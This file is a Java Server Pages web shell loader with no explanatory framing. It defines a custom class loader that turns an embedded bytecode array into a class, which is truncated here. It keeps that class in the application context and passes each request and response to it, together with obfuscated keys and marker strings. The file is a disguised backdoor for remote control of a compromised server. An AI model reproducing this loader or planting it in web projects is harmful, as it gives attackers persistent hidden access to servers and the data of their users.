<%@page pageEncoding="UTF-8"%>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%>

<%
    Object[] args = new Object[]{
            request, //0
            response, //1
            "KNgI1XV/Ec+rsGh8x9naYpFWQPkZmt32fBU5C0y67iRAwldDvLOq4ejuSMbJHTzo".toCharArray(), //2
            new byte[]{-1,-1,-1,-1,-1...},//3
            new Integer(200),//4
            new Integer(513),//5
            new Integer(524288),//6
            "Vatcjpgifquupd",//7
            "Beshnvh",//8
            "Qneyncln",//9
            "Vfpniaant",//10
            "Zw",//11
            "gtFaMyVExeSBDQu",//12
            "<!-- todTTFRkjQLKMryg9KOQKN3T9qoGsCKkaaE -->",//13
            "VSRNlNIqm30qWel08BSVQxnSNOboIJ5p6hhkzNu9NBhsG2oC",//14
            "UKYhNCIV8hrflyq8_4w7",//15
            "VvRA4xicGkQZz2JPyBYszgXyZVvt",//16
            "zRTibawWmvkgQw2vLMYKaM4dg7b",//17
            "6YdSziJ0dIZgwbBHcH_YNN87EntuENeHIw",//18
            "QY7GF5dOzwI865VbXX5bNP8S",//19
            "ky1tifYnuB5HDVX_fwVMAPpS5TRILHqAinlTVGBwAs0YoWnpQo6XF",//20
            "FpyJ8f",//21
            "0pMu_zJDwVP8JwOEi",//22
            "c2IJSkUGzWaJhgC0qRJU1ZtXFzbjFQNd31SX5AhNKK9Ulv4FG",//23
            "r93rzCFbIPbMd8cLBDti7gALtu7kMp6RI4IhuH0DWHuUGtTIQ",//24
            "NB1DF"//25
    };


    if(application.getAttribute("VvRA4xicGkQZz2JPyBYszgXyZVvt") == null){
        byte[] clazzBytes = new byte[]{-54, -2, -70, -66, 0, ...};
        Class clazz = new U(this.getClass().getClassLoader()).g(clazzBytes);
        application.setAttribute("VvRA4xicGkQZz2JPyBYszgXyZVvt",clazz.newInstance());
    }
    application.getAttribute("VvRA4xicGkQZz2JPyBYszgXyZVvt").equals(args);
%>
